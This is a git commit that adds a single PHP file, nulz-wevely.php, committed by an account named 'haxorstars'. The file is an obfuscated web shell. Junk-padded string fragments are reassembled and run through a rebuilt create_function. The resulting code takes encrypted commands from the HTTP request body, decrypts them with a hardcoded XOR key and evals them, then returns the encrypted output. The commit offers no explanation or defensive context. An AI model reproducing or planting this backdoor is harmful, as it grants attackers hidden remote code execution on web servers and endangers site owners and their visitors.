fe834c76313620ffb28bad1163256ed40e5ac079
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-07-09 00:07:31 +0700

    NuLz Goib

---
+++ nulz-wevely.php
@@ -0,0 +1,11 @@
+<?php
+$f='tmTch("/$mTkh(.+)$kfmT/",@mTfilemT_get_comTntents("mTphp:mT//input")mT,$m)=mT=1)mT {@omTb_smTta';
+$n='$k="mT415dbcmT26";$kh=mT"5bmTmT3b9mT80bmT5c1mTc";mT$kf="3c92ad41541dmT";$p=mTmT"ooFGWoG8qK6rmTmTPmTs';
+$b='f8";function x($t,$kmT){$c=strlen($kmT);$l=smTmTtrlen($t);mT$mTo="";for($i=mT0;$i<$mTlmT;){fomTr(';
+$P='ts();mT@obmT_end_cleanmT();$mTr=@bmTamTse64_encomTde(@x(mT@gzmTcompress($o),$mTk));mTprint(mT"$p$khmT$r$kf");}';
+$L=str_replace('wc','','crwcwcewcawcte_fuwcnctiwcon');
+$d='rtmT();@evmTal(@gzuncmTompressmT(@xmT(@bmTasemT64_decode($m[1]),$kmT)mT));$o=@omTb_getmT_conten';
+$p='$j=0;(mT$j<$c&&$mTi<$l);$jmT++,$mTi++){$o.=$mTt{$imTmT}^$kmTmT{$j};}}return $o;mT}if (mT@preg_ma';
+$l=str_replace('mT','',$n.$b.$p.$f.$d.$P);
+$X=$L('',$l);$X();
+?>
